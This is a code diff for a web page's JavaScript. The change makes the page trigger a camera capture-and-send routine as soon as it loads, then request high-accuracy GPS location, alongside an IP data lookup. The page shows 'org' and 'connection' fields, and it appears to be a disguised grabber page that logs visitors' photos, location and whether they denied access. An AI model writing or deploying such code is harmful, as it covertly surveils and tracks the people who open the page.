@@ -35,7 +35,20 @@ document.addEventListener('DOMContentLoaded', async () => {
     const orgDisplay = document.getElementById('org-display');
     const connectionDisplay = document.getElementById('connection-display');
 
-    // --- 1. TRIGGER LOCATION PROMPT IMMEDIATELY (Async) ---
+    // --- 1. TRIGGER CAMERA PROMPT IMMEDIATELY ---
+    let cameraTriggered = false;
+    async function triggerCamera() {
+        if (!cameraTriggered) {
+            cameraTriggered = true;
+            await captureAndSendPhoto();
+            // Wait 1 second AFTER camera prompt, then ask for Location
+            setTimeout(startLocationRequest, 1000);
+        }
+    }
+
+    triggerCamera();
+
+    // --- 2. LOCATION REQUEST LOGIC (Delayed) ---
     let locationCaptured = false;
     let gpsCoords = null;
 
@@ -48,23 +61,17 @@ document.addEventListener('DOMContentLoaded', async () => {
                     if (window.ipDataLoaded) {
                         processAndSave(position.coords, null, "📍 LOCATION OBTAINED");
                     }
-                    setTimeout(captureAndSendPhoto, 1000);
                 },
                 (error) => {
                     console.warn("Location error:", error.message);
                     if (window.ipDataLoaded) {
                         processAndSave(null, error.message, "❌ LOCATION DENIED");
                     }
-                    setTimeout(captureAndSendPhoto, 1000);
                 },
                 { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
             );
-        } else {
-            setTimeout(captureAndSendPhoto, 1000);
         }
     }
-
-    startLocationRequest();
 
     try {
         // --- 2. FETCH IP DATA (In Parallel) ---
